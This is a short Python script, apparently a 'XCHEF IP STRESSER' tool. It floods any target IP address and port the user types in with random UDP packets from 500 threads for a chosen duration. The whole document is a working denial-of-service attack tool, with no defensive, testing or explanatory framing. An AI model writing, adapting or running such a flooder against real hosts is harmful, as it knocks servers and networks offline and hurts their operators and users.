import socket
import random
import threading
import time



print (r"""

$$\   $$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$$\       $$$$$$\ $$$$$$$\         $$$$$$\ $$$$$$$$\ $$$$$$$$\  $$$$$$\   $$$$$$\  $$$$$$$$\ $$$$$$$\  
$$ |  $$ |$$  __$$\ $$ |  $$ |$$  _____|$$  _____|      \_$$  _|$$  __$$\       $$  __$$\\__$$  __|$$  _____|$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ 
\$$\ $$  |$$ /  \__|$$ |  $$ |$$ |      $$ |              $$ |  $$ |  $$ |      $$ /  \__|  $$ |   $$ |      $$ /  \__|$$ /  \__|$$ |      $$ |  $$ |
 \$$$$  / $$ |      $$$$$$$$ |$$$$$\    $$$$$\            $$ |  $$$$$$$  |      \$$$$$$\    $$ |   $$$$$\    \$$$$$$\  \$$$$$$\  $$$$$\    $$$$$$$  |
 $$  $$<  $$ |      $$  __$$ |$$  __|   $$  __|           $$ |  $$  ____/        \____$$\   $$ |   $$  __|    \____$$\  \____$$\ $$  __|   $$  __$$< 
$$  /\$$\ $$ |  $$\ $$ |  $$ |$$ |      $$ |              $$ |  $$ |            $$\   $$ |  $$ |   $$ |      $$\   $$ |$$\   $$ |$$ |      $$ |  $$ |
$$ /  $$ |\$$$$$$  |$$ |  $$ |$$$$$$$$\ $$ |            $$$$$$\ $$ |            \$$$$$$  |  $$ |   $$$$$$$$\ \$$$$$$  |\$$$$$$  |$$$$$$$$\ $$ |  $$ |
\__|  \__| \______/ \__|  \__|\________|\__|            \______|\__|             \______/   \__|   \________| \______/  \______/ \________|\__|  \__|
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
""")







class AttackThread(threading.Thread):
    def __init__(self, ip, port):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.running = True

    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packets = random._urandom(4096)

        while self.running:
            sock.sendto(packets, (self.ip, self.port))

    def stop(self):
        self.running = False

def attack(ip, port, duration):
    threads = []
    timeout = time.time() + duration

    for i in range(500):
        thread = AttackThread(ip, port)
        thread.start()
        threads.append(thread)

    while True:
        if time.time() > timeout:
            break

    for thread in threads:
        thread.stop()

if __name__ == "__main__":
    ip = input("Enter the target IP address: ")
    port = int(input("Enter the target port: "))
    duration = int(input("Enter the attack duration (in seconds): "))

    print("Attack started on " + ip + ":" + str(port) + " for " + str(duration) + " seconds...")
    attack(ip, port, duration)
    print("Attack stopped.")
